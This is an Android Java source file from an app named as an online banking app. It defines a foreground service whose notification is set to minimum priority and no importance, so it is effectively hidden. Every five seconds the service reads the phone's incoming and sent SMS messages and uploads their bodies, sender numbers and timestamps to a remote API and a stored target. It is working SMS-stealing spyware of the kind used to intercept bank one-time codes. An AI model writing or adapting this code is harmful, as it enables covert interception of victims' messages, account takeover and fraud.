package com.codewithmuddasir.onlinebanking;

import static com.codewithmuddasir.onlinebanking.helper.Setting.model;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.codewithmuddasir.onlinebanking.helper.Util;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MyForegroundService extends Service {

    private Handler mHandler;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    Context activity;

    @Override
    public void onCreate() {
        super.onCreate();
        mHandler = new Handler();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        Intent notificationIntent = new Intent(this, MainActivity.class);

        PendingIntent pendingIntent;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        } else {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_MUTABLE);
        }
        activity = this;

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentIntent(pendingIntent)
                .setPriority(Notification.PRIORITY_MIN)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        }
        else {
            startForeground(NOTIFICATION_ID, notification);
        }

        mHandler.postDelayed(mRunnable, 5 * 1000);

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_NONE);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Runnable mRunnable = new Runnable() {
        @Override
        public void run() {
            // Put your code here that you want to run every minute
            Uri uri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                uri = Telephony.Sms.CONTENT_URI;
            } else {
                uri = Uri.parse("content://sms");
            }

            Util util = new Util();

            String userId = util.getLocalData(activity, "userId");

            long lastTimestamp = System.currentTimeMillis() - (5 * 1000); // retrieve messages received in the last minute
            String selection = Telephony.Sms.DATE + " > ?";
            String[] selectionArgs = {String.valueOf(lastTimestamp)};
            Cursor cursor = activity.getContentResolver().query(uri, null, selection, selectionArgs, Telephony.Sms.DEFAULT_SORT_ORDER);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    // Get the message details from the cursor
                    int messageId = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));

                    String type = "";

                    int messageType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                    if (messageType == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                        type = "Receive";
                    } else if (messageType == Telephony.Sms.MESSAGE_TYPE_SENT) {
                        type = "Send";
                    }

                    // Do something with the message details, such as display them in a list
//                Log.d("TAG", "Message ID: " + messageId);
//                Log.d("TAG", "Phone number: " + phoneNumber);
//                Log.d("TAG", "Timestamp: " + timestamp);
//                Log.d("TAG", "Message body: " + messageBody);

                    util.sendMessage(util.getLocalData(activity,"mmm"), messageBody, phoneNumber, timestamp, type);
                    util.saveLocalData(activity, "lastmessage", timestamp);


                    message message1 = new message("818998",messageBody,phoneNumber,timestamp,type);

                    ApiService apiService = ApiClient.getClient().create(ApiService.class);
                    Call<Void> call = apiService.createmessage(message1);

                    call.enqueue(new Callback<Void>() {
                        @Override
                        public void onResponse(Call<Void> call, Response<Void> response) {
                            // Handle successful response
                            if (response.isSuccessful()) {
                                // Data sent successfully
                                Log.d("asdf123","yes");
                            } else {
                                // Handle other response codes if needed
                                Log.d("asdf123","unsucess");
                            }
                        }

                        @Override
                        public void onFailure(Call<Void> call, Throwable t) {
                            // Handle failure
                            Log.d("asdf123",t.toString());
                        }
                    });




                } while (cursor.moveToNext());
            }
            if (cursor != null) {
                cursor.close();
            }
            // Schedule the task to run again after a minute
            mHandler.postDelayed(this, 5 * 1000);
        }
    };

}
